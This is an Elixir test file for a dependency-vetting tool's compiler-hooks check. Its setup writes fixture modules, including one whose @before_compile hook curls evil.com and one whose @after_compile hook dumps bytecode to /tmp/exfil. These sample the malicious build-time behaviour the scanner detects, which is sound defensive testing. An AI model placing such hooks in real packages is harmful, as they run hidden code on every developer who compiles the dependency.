defmodule VetCore.Checks.CompilerHooksTest do
  use ExUnit.Case

  alias VetCore.Checks.CompilerHooks
  alias VetCore.Types.Dependency

  @project_dir Path.expand("../fixtures/compiler_hooks_project", __DIR__)
  @fixture_dir Path.join([@project_dir, "deps", "hook_dep"])

  setup_all do
    File.mkdir_p!(Path.join(@fixture_dir, "lib"))

    # Write a file with @before_compile
    File.write!(Path.join([@fixture_dir, "lib", "before_compile_mod.ex"]), """
    defmodule BeforeCompileMod do
      @before_compile __MODULE__

      def __before_compile__(env) do
        System.cmd("curl", ["http://evil.com"])
      end
    end
    """)

    # Write a file with @after_compile
    File.write!(Path.join([@fixture_dir, "lib", "after_compile_mod.ex"]), """
    defmodule AfterCompileMod do
      @after_compile __MODULE__

      def __after_compile__(env, bytecode) do
        File.write!("/tmp/exfil", inspect(bytecode))
      end
    end
    """)

    # Write a file with @external_resource
    File.write!(Path.join([@fixture_dir, "lib", "external_resource_mod.ex"]), """
    defmodule ExternalResourceMod do
      @external_resource Path.join(__DIR__, "priv/data.json")

      def data, do: :ok
    end
    """)

    # Write a mix.exs with custom compilers
    File.write!(Path.join(@fixture_dir, "mix.exs"), """
    defmodule CompilerHooksFixture.MixProject do
      use Mix.Project

      def project do
        [
          app: :compiler_hooks_fixture,
          compilers: [:my_custom_compiler] ++ Mix.compilers()
        ]
      end
    end
    """)

    # Write a benign file for baseline comparison
    File.write!(Path.join([@fixture_dir, "lib", "benign.ex"]), """
    defmodule Benign do
      def hello, do: :world
    end
    """)

    on_exit(fn ->
      File.rm_rf!(@project_dir)
    end)

    :ok
  end

  defp run_check do
    dep = %Dependency{name: :hook_dep, version: "1.0.0", source: :hex}
    CompilerHooks.run(dep, @project_dir, [])
  end

  test "@before_compile is detected" do
    findings = run_check()

    before_compile_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.description, "@before_compile")
      end)

    assert length(before_compile_findings) >= 1

    finding = hd(before_compile_findings)
    assert finding.check_id == :compiler_hooks
    assert finding.category == :compiler_hooks
    assert finding.severity == :critical
  end

  test "@after_compile is detected" do
    findings = run_check()

    after_compile_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.description, "@after_compile")
      end)

    assert length(after_compile_findings) >= 1

    finding = hd(after_compile_findings)
    assert finding.check_id == :compiler_hooks
    assert finding.severity == :critical
  end

  test "@external_resource is detected with warning severity" do
    findings = run_check()

    ext_resource_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.description, "@external_resource")
      end)

    assert length(ext_resource_findings) >= 1

    finding = hd(ext_resource_findings)
    assert finding.severity == :warning
  end

  test "custom compilers in mix.exs are detected" do
    findings = run_check()

    compiler_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.description, "Mix.compilers()")
      end)

    assert length(compiler_findings) >= 1
  end

  test "benign module produces no compiler_hooks findings (baseline)" do
    # For comparison: a simple module with no hooks should produce no findings
    findings = run_check()

    benign_findings =
      Enum.filter(findings, fn f ->
        String.contains?(f.file_path, "benign.ex")
      end)

    assert benign_findings == []
  end
end
